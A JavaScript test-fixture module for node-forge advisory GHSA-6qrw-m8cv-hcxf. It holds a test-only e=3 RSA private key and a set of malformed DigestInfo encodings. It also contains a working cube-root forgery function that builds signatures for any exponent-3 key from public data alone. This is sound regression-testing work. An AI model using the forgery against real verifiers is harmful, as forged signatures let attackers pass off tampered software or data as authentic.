/**
 * RSASSA-PKCS1-v1_5 vectors for node-forge GHSA-6qrw-m8cv-hcxf. The RSA-2048 key has public
 * exponent 3 and came from
 * `openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -pkeyopt rsa_keygen_pubexp:3 | openssl pkcs8 -topk8 -nocrypt -outform DER | base64 -w0`.
 * Never use this key outside tests.
 * @module
 */

export const pkcs8 =
	'MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDFzLeFcDhcp07ffnWBcnsk4PMjtPkcDqlAfRzq8FtolLxAUXvKAzKKmS4uCf6j+VZ0tDDB8IK/PlQredvVDKbGjfB+2OetBihhdBoYxwfGiDzD4mwNy4jvADR5tuK0cDhI5/8HHLRF8rMdc/Pia4kJ1FrGxMlCCsRn9qPpjipxYeK4dgDNuYftmVhn5kP7MGfiKLgY2euf4GV7TONBU/vnR1rxMk1BUgNwv8g/zFGvtZmPhI+PM8TeG7rHOyUYiObn/7Bn3h1mCzse5tgtDv5WS7HT3HolnDk3d7gWP2piyA7qPnfots7piW+FdAyjCU/4luXAj/INoOZ+DHSpoG9tAgEDAoIBAQCD3c+uStA9xN8/qaOroadt60zCeKYStHDVqL3x9ZJFuH2ANlKGrMxcZh7JW/8X+474eCCBSwHU1Dgc++fjXcSEXqBUkJpzWXBA+BFl2gUvBX3X7EgJMltKACL7z0HNoCWF7/9aEyLZTHdo9/fsR7CxODyEgzDWsdhFTxfxCXGg6sBQ2QcixbZM6XSoJNC/gQS0U2RKRKO/WL/fxUaSBToRJE8PM63JDjuDk62ZZ6Qm4AmQFkrskJFfbwDhIxymTT3u+U85Fa79x6JFUxj4aquFolPPyPasxzdOZk7M8V3JsRvyfk3VQXKKPOe0IAMuMRxLukXb1GVNsX8L+4ysffjTAoGBAOe+iRh6Jjuz4vAeEv4BlJ0QEQXrzY4qHNL4US6pt3HCf2I0U+IruyzT4JmTk2lhLVRs9hdnpR5duQUTt5RwZZa7v9ksQ0f67x5gg2M4ARRmhB+PzVBDMPRAtKSU7P6mu3tmH7tlOSG5Y2mV8TsJjzSILAczhMQmbt7xMlH/F4HXAoGBANqAp12farrGWDlNnAzaWkPDmpu9pWfWvnKzU8q8lLMLEYImEOZoAX1XgapGHXIUODbKbQfEtcxxPDRhzuWur3NFyeBl+k7ucKlWZs+AbeinVBSMYbffQHIBKZ1N6F8NgumYYUfDm4FgyqphUszUMHD+03XDTJXyp8j64M+ny/hbAoGBAJp/BhBRbtJ37KAUDKlWYxNgC1lH3l7GveH64MnGekvW/5bNjUFyfMiNQGZiYkZAyOLzTrpFGL7pJgNiemL1mQ8n1Tty14VR9L7rAkIlVg2ZrWpf3jWCIKLVzcMN81RvJ6eZanzuJhZ7l5u5S3yxCiMFcq93rdgZnz9LduFUulaPAoGBAJGrGj5qRycu5XuJErM8PC0tEb0pGO/kfvciN9x9uHdctlbEC0RFVlOPq8bZaPa4JXncSK/YeTL2KCLr30PJykzZMUBD/DSe9cY5md+q8/BvjWMIQSU/gEwAxmjemuoJAfEQQNqCZ6uV3HGWNzM4IEtUjPks3blMb9tR6zUah/rnAoGANKUGxjFxp+CK4+x74hn1aQPjtJ9dcW7KMZHk5LMZq6rhbdK0vXGv7SSinBZr+SyqL/LVq0iDf3YCiyArsg8x8nG8GzQS/yEG7L4ziIMkyogBF1jqpTEwKsYPdV43NDl1Ra3Kr0rZNBBpTdrkPRsj1nBNSJiGY3Oirw+ujR+Qhq4=';

const sha256Oid = [0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01];
const canonicalHead = [0x30, 0x31, 0x30, 0x0d, ...sha256Oid, 0x05, 0x00, 0x04, 0x20];

/**
 * @typedef {object} DigestInfoVariant
 * @property {string} name
 * @property {Uint8Array} digestInfo
 * @property {boolean} valid Whether RFC 8017 section 8.2.2 accepts the encoding.
 */

/**
 * @param {readonly number[]} head
 * @param {Uint8Array} digest
 * @param {readonly number[]} [tail]
 */
function join(head, digest, tail = []) {
	return Uint8Array.from([...head, ...digest, ...tail]);
}

/**
 * The canonical SHA-256 DigestInfo and each non-canonical shape named in the advisory.
 * @param {Uint8Array} digest A SHA-256 digest.
 * @returns {readonly DigestInfoVariant[]}
 */
export function digestInfoVariants(digest) {
	return [
		{ name: 'canonical DER', valid: true, digestInfo: join(canonicalHead, digest) },
		{
			name: 'absent parameters',
			valid: false,
			digestInfo: join([0x30, 0x2f, 0x30, 0x0b, ...sha256Oid, 0x04, 0x20], digest),
		},
		{
			name: 'NULL parameters with content',
			valid: false,
			digestInfo: join(
				[0x30, 0x33, 0x30, 0x0f, ...sha256Oid, 0x05, 0x02, 0xbe, 0xef, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'long-form DigestInfo length',
			valid: false,
			digestInfo: join(
				[0x30, 0x81, 0x31, 0x30, 0x0d, ...sha256Oid, 0x05, 0x00, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'long-form DigestAlgorithm length',
			valid: false,
			digestInfo: join(
				[0x30, 0x32, 0x30, 0x81, 0x0d, ...sha256Oid, 0x05, 0x00, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'long-form OID length',
			valid: false,
			digestInfo: join(
				[0x30, 0x32, 0x30, 0x0e, 0x06, 0x81, ...sha256Oid.slice(1), 0x05, 0x00, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'long-form NULL length',
			valid: false,
			digestInfo: join(
				[0x30, 0x32, 0x30, 0x0e, ...sha256Oid, 0x05, 0x81, 0x00, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'long-form digest length',
			valid: false,
			digestInfo: join(
				[0x30, 0x32, 0x30, 0x0d, ...sha256Oid, 0x05, 0x00, 0x04, 0x81, 0x20],
				digest,
			),
		},
		{
			name: 'indefinite DigestInfo length',
			valid: false,
			digestInfo: join(
				[0x30, 0x80, 0x30, 0x0d, ...sha256Oid, 0x05, 0x00, 0x04, 0x20],
				digest,
				[0x00, 0x00],
			),
		},
		{
			name: 'constructed parameters',
			valid: false,
			digestInfo: join(
				[0x30, 0x33, 0x30, 0x0f, ...sha256Oid, 0x30, 0x02, 0x05, 0x00, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'INTEGER parameters',
			valid: false,
			digestInfo: join(
				[0x30, 0x32, 0x30, 0x0e, ...sha256Oid, 0x02, 0x01, 0x00, 0x04, 0x20],
				digest,
			),
		},
		{
			name: 'padded OID subidentifier',
			valid: false,
			digestInfo: join(
				[
					0x30, 0x32, 0x30, 0x0e, 0x06, 0x0a, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x80,
					0x01, 0x05, 0x00, 0x04, 0x20,
				],
				digest,
			),
		},
		{
			name: 'octets after the DigestInfo',
			valid: false,
			digestInfo: join(canonicalHead, digest, [0x00, 0x00]),
		},
	];
}

/** @param {Uint8Array} bytes */
function toBigint(bytes) {
	let value = 0n;
	for (const byte of bytes) value = (value << 8n) | BigInt(byte);
	return value;
}

/**
 * @param {bigint} value
 * @param {number} length
 */
function toBytes(value, length) {
	const bytes = new Uint8Array(length);
	let rest = value;
	for (let index = length - 1; index >= 0; index -= 1) {
		bytes[index] = Number(rest & 0xffn);
		rest >>= 8n;
	}
	if (rest !== 0n) throw new Error('Fixture integer exceeds the modulus length');
	return bytes;
}

/** @param {string} text */
function fromBase64Url(text) {
	const binary = atob(text.replaceAll('-', '+').replaceAll('_', '/'));
	return Uint8Array.from(binary, (char) => char.charCodeAt(0));
}

/**
 * @param {bigint} base
 * @param {bigint} exponent
 * @param {bigint} modulus
 */
function modPow(base, exponent, modulus) {
	let result = 1n;
	let factor = base % modulus;
	let rest = exponent;
	while (rest > 0n) {
		if ((rest & 1n) === 1n) result = (result * factor) % modulus;
		factor = (factor * factor) % modulus;
		rest >>= 1n;
	}
	return result;
}

/**
 * EMSA-PKCS1-v1_5 block `00 01 FF..FF 00 || t` of `length` octets.
 * @param {Uint8Array} t
 * @param {number} length
 */
export function encodedMessage(t, length) {
	if (length - t.length - 3 < 8)
		throw new Error('Fixture DigestInfo leaves fewer than 8 padding octets');
	const block = new Uint8Array(length).fill(0xff);
	block[0] = 0x00;
	block[1] = 0x01;
	block[length - t.length - 1] = 0x00;
	block.set(t, length - t.length);
	return block;
}

/**
 * Applies the raw RSA private operation to `00 01 FF..FF 00 || digestInfo`.
 * @param {CryptoKey} privateKey An extractable RSA private key.
 * @param {Uint8Array} digestInfo
 */
export async function signDigestInfo(privateKey, digestInfo) {
	const jwk = await crypto.subtle.exportKey('jwk', privateKey);
	if (typeof jwk.n !== 'string' || typeof jwk.d !== 'string') {
		throw new Error('Fixture requires an extractable RSA private key');
	}
	const modulus = fromBase64Url(jwk.n);
	const n = toBigint(modulus);
	const block = toBigint(encodedMessage(digestInfo, modulus.length));
	return toBytes(modPow(block, toBigint(fromBase64Url(jwk.d)), n), modulus.length);
}

/**
 * Applies the raw RSA public operation, recovering the encoded message a verifier sees.
 * @param {CryptoKey} publicKey An extractable RSA public key.
 * @param {Uint8Array} signature
 */
export async function recoverEncodedMessage(publicKey, signature) {
	const jwk = await crypto.subtle.exportKey('jwk', publicKey);
	if (typeof jwk.n !== 'string' || typeof jwk.e !== 'string') {
		throw new Error('Fixture requires an RSA public key');
	}
	const modulus = fromBase64Url(jwk.n);
	return toBytes(
		modPow(toBigint(signature), toBigint(fromBase64Url(jwk.e)), toBigint(modulus)),
		modulus.length,
	);
}

/** @param {number} length */
function derLength(length) {
	if (length < 0x80) return [length];
	if (length < 0x100) return [0x81, length];
	return [0x82, length >> 8, length & 0xff];
}

/**
 * Content length whose TLV, including a one-octet tag, spans `total` octets.
 * @param {number} total
 */
function contentLength(total) {
	for (let length = total - 2; length > 0; length -= 1) {
		const encoded = 1 + derLength(length).length + length;
		if (encoded === total) return length;
		if (encoded < total) break;
	}
	throw new Error(`No DER length fills ${total} octets`);
}

/** @param {bigint} value */
function integerCubeRoot(value) {
	if (value < 2n) return value;
	let root = 1n << BigInt(Math.ceil(value.toString(2).length / 3));
	for (;;) {
		const next = (2n * root + value / (root * root)) / 3n;
		if (next >= root) break;
		root = next;
	}
	while (root ** 3n > value) root -= 1n;
	return root;
}

/**
 * Odd cube root of an odd `value` modulo 2^bits.
 * @param {bigint} value
 * @param {bigint} bits
 */
function cubeRootModPowerOfTwo(value, bits) {
	const mask = (1n << bits) - 1n;
	let root = 1n;
	for (let bit = 1n; bit < bits; bit += 1n) {
		if ((((root ** 3n - value) & mask) >> bit) & 1n) root += 1n << bit;
	}
	return root;
}

/**
 * Public-material-only signature for any e=3 RSA key whose modulus spans `length` octets.
 * Over the integers the signature cubes to `00 01 FF..FF 00 || DigestInfo`. The DigestInfo has the
 * canonical SHA-256 algorithm OID and digest, and NULL parameters with content that absorb the
 * cube root's slack (GHSA-6qrw-m8cv-hcxf, CVE-2014-1568).
 * @param {Uint8Array} digest A SHA-256 digest whose last octet is odd.
 * @param {number} length Modulus length in octets.
 */
export function forgeExponentThreeSignature(digest, length) {
	if (digest.length !== 32 || ((digest[31] ?? 0) & 1) === 0) {
		throw new Error('Forgery requires a SHA-256 digest with an odd last octet');
	}
	const suffix = [0x04, 0x20, ...digest];
	const padding = [0x00, 0x01, ...new Array(8).fill(0xff), 0x00];
	const digestInfo = contentLength(length - padding.length);
	const algorithm = contentLength(digestInfo - suffix.length);
	const parameters = contentLength(algorithm - sha256Oid.length);
	const prefix = Uint8Array.from([
		...padding,
		0x30,
		...derLength(digestInfo),
		0x30,
		...derLength(algorithm),
		...sha256Oid,
		0x05,
		...derLength(parameters),
	]);
	const suffixBits = BigInt(suffix.length * 8);
	const freeBits = BigInt((parameters + suffix.length) * 8);
	const top = integerCubeRoot(toBigint(prefix) << freeBits) + 1n;
	const low = cubeRootModPowerOfTwo(toBigint(Uint8Array.from(suffix)), suffixBits);
	const signature = (((top >> suffixBits) + 1n) << suffixBits) | low;
	const block = toBytes(signature ** 3n, length);
	const tail = block.subarray(length - suffix.length);
	if (
		!prefix.every((byte, index) => block[index] === byte) ||
		!suffix.every((byte, index) => tail[index] === byte)
	) {
		throw new Error('Cube-root forgery did not reproduce the target encoding');
	}
	return toBytes(signature, length);
}

/**
 * Returns the first message `${label} ${n}` whose SHA-256 digest ends in an odd octet.
 * @param {string} label
 */
export async function oddDigestMessage(label) {
	for (let counter = 0; ; counter += 1) {
		const data = new TextEncoder().encode(`${label} ${counter}`);
		const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', data));
		if (((digest[31] ?? 0) & 1) === 1) return { data, digest };
	}
}
